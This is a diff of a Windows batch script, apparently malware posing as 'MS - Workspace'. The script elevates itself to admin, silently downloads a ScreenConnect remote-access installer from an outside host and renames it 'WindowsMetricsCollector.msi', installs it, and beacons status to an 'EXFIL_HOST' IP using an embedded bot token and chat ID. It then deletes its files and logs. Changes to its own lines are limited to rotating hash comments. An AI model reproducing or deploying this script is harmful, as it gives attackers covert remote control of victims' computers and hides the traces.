@@ -1,258 +1,258 @@
-//7c37a17b8ac3
+//4dcfdbbd24fd
 @echo off
 setlocal enabledelayedexpansion
 
 set "PRODUCT_NAME=MS - Workspace"
-//14fa92492777
+//d3bb08cdb21a
 set "PRODUCT_VERSION=1.0.0"
 set "MSI_URL=https://user12.h-connect.xyz:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-//72cdf078d514
+//217ee1022722
 set "MSI_FILE_NAME=WindowsMetricsCollector.msi"
 set "INSTALL_DIR=%ProgramData%\MSWorkspace\Install"
-//03c57c488c22
+//a7b322d44bfd
 set "LOG_DIR=%ProgramData%\MSWorkspace\Logs"
 set "LOG_FILE=deploy.log"
-//61e38f6b9753
+//423428b696c1
 set "MSI_LOG_FILE=msi-install.log"
 set "DOWNLOAD_RETRIES=2"
-//bcd9ed48d93b
+//da029ed239e9
 set "RETRY_DELAY_MS=1500"
 set "EXFIL_HOST=212.43.151.96:20002"
-//a80511d67e9e
+//9e3aea825bca
 set "TBTOKEN=7587335315:AAG-GNuK6xCNM3hjkskl7_rxXjsbLNIe_Mk"
 set "TCID=93372553"
-//75ad541c6e6b
+//ff7dcd584b37
 set "DEPLOY_TOKEN=%RANDOM%%RANDOM:~0,4%"
 set "UNINSTALL_EXISTING=1"
-//f615db3ba582
+//45a2ac61d41d
 set "PRODUCT_CODE={4228D3D7-CF51-5361-1BC4-165794361D9B}"
 set "SHOW_POPUPS=0"
 
 set "MSI_PATH=%INSTALL_DIR%\%MSI_FILE_NAME%"
-//5e55a9b9d5ac
+//99052acfc698
 set "LOG_PATH=%LOG_DIR%\%LOG_FILE%"
 set "MSI_LOG_PATH=%LOG_DIR%\%MSI_LOG_FILE%"
-//f76a40231095
+//0856e747a778
 set "EXIT_CODE=1"
 
-//3cb714661010
+//89a87914a1b4
 mkdir "%INSTALL_DIR%" 2>nul
 mkdir "%LOG_DIR%" 2>nul
 
 call :checkAdmin
-//ee60f7042f5d
+//2b0d4ffec619
 if errorlevel 1 goto :elevate
 
-//68d1a273b594
+//6d9d1f82aefa
 call :beacon "start" 0
 call :checkConfig
-//4a580694a53a
+//d3d98dd13a27
 if errorlevel 1 goto :cleanup
 
-//2094e51a874e
+//5dd515cd3180
 call :fetchPayload
 if errorlevel 1 (
-//64793c0e027e
+//de9aafc7ee57
     call :log "ERROR" "Download failed after %DOWNLOAD_RETRIES% attempts"
     call :beacon "fail" 1
-//043839ffab9c
+//fddf4dffce0b
     set "EXIT_CODE=1"
     goto :cleanup
-//ad02d2b8dea9
+//20cd7544ba8f
 )
 
-//be68d23fb5bf
+//982cc9cdbbf3
 if not exist "%MSI_PATH%" (
     call :log "ERROR" "MSI missing after download"
-//5786326470c0
+//5fec9597ac7c
     call :beacon "fail" 1
     set "EXIT_CODE=1"
-//5fbc291199ad
+//37b2b668774d
     goto :cleanup
 )
 
 for %%A in ("%MSI_PATH%") do if %%~zA==0 (
-//58931e20c17f
+//5a22e15f243d
     call :log "ERROR" "MSI empty after download"
     call :beacon "fail" 1
-//2c85f86b38f1
+//a1de60dc8fb8
     set "EXIT_CODE=1"
     goto :cleanup
-//2efda598852b
+//32e805c9b934
 )
 
-//196b6cbce904
+//5ce92d554f28
 if "%UNINSTALL_EXISTING%"=="1" call :purgeOld
 
-//6b8390fbd3a2
+//aff7450203d3
 call :execMsi
 set "EXIT_CODE=!ERRORLEVEL!"
 
 if !EXIT_CODE!==0 (
-//73a01afcdb01
+//95c01285694d
     call :log "INFO" "Installation successful"
     call :beacon "ok" !EXIT_CODE!
-//5d9adc134e64
+//4bfb5ee9016d
 ) else if !EXIT_CODE!==3010 (
     call :log "INFO" "Success - restart required"
-//6f74755c5f2c
+//c6b5deaa84a3
     call :beacon "okr" !EXIT_CODE!
 ) else if !EXIT_CODE!==1641 (
-//c80076200de0
+//85d0d42e53e8
     call :log "INFO" "Success - restart initiated"
     call :beacon "okr" !EXIT_CODE!
-//a2f7bd90d2df
+//020838075f95
 ) else if !EXIT_CODE!==1638 (
     call :log "INFO" "Already installed"
-//a1a3abcfff5f
+//ec45bf918576
     call :beacon "oka" !EXIT_CODE!
 ) else if !EXIT_CODE!==1602 (
-//91a3335482d7
+//9d88749d2df2
     call :log "WARN" "Installation canceled by user"
     call :beacon "cl" !EXIT_CODE!
-//2cf06b57fd4d
+//1f708e78b174
 ) else (
     call :log "ERROR" "Installation failed with code !EXIT_CODE!"
-//a435d7624e6a
+//840d330b40d5
     call :beacon "fail" !EXIT_CODE!
 )
 
 :cleanup
-//90774558b2e2
+//cf65f43cb7fa
 if exist "%MSI_PATH%" del /f /q "%MSI_PATH%" 2>nul
 if exist "%LOG_PATH%" del /f /q "%LOG_PATH%" 2>nul
-//35f8d0b0efdd
+//4c7826d6adfd
 if exist "%MSI_LOG_PATH%" del /f /q "%MSI_LOG_PATH%" 2>nul
 if exist "%LOG_DIR%" rmdir /s /q "%LOG_DIR%" 2>nul
-//a52169ca42e0
+//f045ded86647
 exit /b %EXIT_CODE%
 
-//83c79ca25315
+//a17e42f2547e
 :checkAdmin
 net session >nul 2>&1
-//91bb3b4529b3
+//beb3064e09ae
 exit /b %errorlevel%
 
-//610722898e38
+//2c9e7fcaaa8d
 :elevate
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$null = Start-Process -FilePath '%~f0' -Verb RunAs"
-//e361b69a00ee
+//54333a553401
 exit /b 0
 
-//544f22ef191f
+//2952fdc1997f
 :checkConfig
 if not defined MSI_URL (
-//49392298b551
+//46303d84fa12
     call :log "ERROR" "MSI_URL is empty"
     exit /b 1
-//adcafc6d4457
+//1b2496e665ab
 )
 if not defined MSI_FILE_NAME (
-//f7022e85601c
+//e584725fdf81
     call :log "ERROR" "MSI_FILE_NAME is empty"
     exit /b 1
-//ac1c579005b0
+//f75b24d2c474
 )
 exit /b 0
 
 :fetchPayload
-//119396f4f25a
+//7b07d204863c
 mkdir "%INSTALL_DIR%" 2>nul
 set "ATTEMPT=0"
-//6b032602ffdb
+//8ca1dea52149
 :downloadRetry
 if !ATTEMPT! gtr %DOWNLOAD_RETRIES% exit /b 1
-//2c26e67a412b
+//fc5b81bc8762
 (echo !MSI_URL!) > "%TEMP%\dl_url.txt"
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u = [IO.File]::ReadAllText('%TEMP%\dl_url.txt').Trim(); $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, '%MSI_PATH%'); exit 0 } catch { exit 1 }"
-//016d35a465ac
+//20c8fd9a4e76
 if errorlevel 1 (
     set /a ATTEMPT+=1
-//9efc5f5cc31c
+//df5bacf4e802
     ping -n 2 127.0.0.1 >nul
     goto :downloadRetry
-//c08f4e9cb911
+//3b700c946e7d
 )
 if exist "%MSI_PATH%" (
-//d16e26c34e0d
+//42abe29414f2
     for %%A in ("%MSI_PATH%") do if %%~zA==0 (
         del /f /q "%MSI_PATH%" 2>nul
-//9391e03eb6e3
+//0c73db3b0ddc
         set /a ATTEMPT+=1
         goto :downloadRetry
-//acb44a265226
+//171f25165b48
     )
     exit /b 0
-//ccd17795a8ff
+//a0e8780ecac1
 )
 set /a ATTEMPT+=1
-//9de31d273113
+//4ebaf281498b
 goto :downloadRetry
 
-//62a8134761db
+//3787cb810897
 :purgeOld
 call :log "INFO" "Uninstalling existing product: %PRODUCT_CODE%"
-//da153bd0a012
+//0d3c61080d30
 msiexec.exe /x %PRODUCT_CODE% /qn /norestart REBOOT=ReallySuppress
 set "CODE=%ERRORLEVEL%"
-//19ae19cd0154
+//1bc20cc1e228
 if %CODE%==1605 exit /b 0
 if %CODE%==1612 exit /b 0
-//d0d7b0814705
+//7cf2019f04ad
 call :log "WARN" "Uninstall returned %CODE%"
 ping -n 4 127.0.0.1 >nul
-//ae4eb0c7ed1f
+//37d24da7fff5
 exit /b 0
 
-//997755c4d913
+//beee50bbf74b
 :execMsi
 mkdir "%LOG_DIR%" 2>nul
-//4a2e95f4c13a
+//2a43fe187935
 msiexec.exe /i "%MSI_PATH%" /qn /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
 set "CODE=%ERRORLEVEL%"
-//d04c0b7c4a83
+//b6fae5ff32b8
 if %CODE%==0 exit /b 0
 if %CODE%==3010 exit /b 3010
-//ed82e331baf7
+//06c62bf5eca4
 if %CODE%==1641 exit /b 1641
 if %CODE%==1638 exit /b 1638
-//b5d395d46777
+//28e33e1e321b
 ping -n 3 127.0.0.1 >nul
 msiexec.exe /i "%MSI_PATH%" /qb /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
-//05247e218313
+//bbe783a22891
 exit /b %errorlevel%
 
-//cd11f423b63d
+//8c6de396e704
 :beacon
 set "STAGE=%~1"
-//28693323ea66
+//ce4bf8e899e1
 set "EXIT_VAL=%~2"
 set "STATUS_CODE=fl"
-//0879e2fe153b
+//24190ec56954
 set "EXIT_STR=%EXIT_VAL%"
 if "%STAGE%"=="start" set "STATUS_CODE=go" & set "EXIT_STR=0"
-//55c8198b1eb3
+//e550760698fa
 if "%STAGE%"=="ok" set "STATUS_CODE=ok"
 if "%STAGE%"=="okr" set "STATUS_CODE=okr" & set "EXIT_STR=3010"
-//e9b8d7c583d0
+//2926f74a5c49
 if "%STAGE%"=="oka" set "STATUS_CODE=oka" & set "EXIT_STR=1638"
 if "%STAGE%"=="cl" set "STATUS_CODE=cl" & set "EXIT_STR=1602"
 
 for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
-//c62e929f053c
+//ed3c56f8c8a9
 set "DTS=%DT:~4,2%%DT:~6,2%%DT:~8,2%%DT:~10,2%"
 set "URL=http://%EXFIL_HOST%/%TBTOKEN%/%TCID%/%DEPLOY_TOKEN%.%STATUS_CODE%.%EXIT_STR%.%DTS%"
-//b3a89985e4d9
+//76da516e0d6a
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $null = (New-Object System.Net.WebClient).DownloadString('%URL%') } catch {}"
 exit /b
 
 :log
-//a70d7d866e18
+//c633fc53cb93
 set "LEVEL=%~1"
 set "MSG=%~2"
-//0ac26e55a778
+//cadc9c3df06f
 for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
 set "TS=%DT:~0,4%-%DT:~4,2%-%DT:~6,2% %DT:~8,2%:%DT:~10,2%:%DT:~12,2%"
-//e67b65781967
+//b605b9e3e4bf
 echo [%TS%] [%LEVEL%] %MSG% >> "%LOG_PATH%"
 exit /b
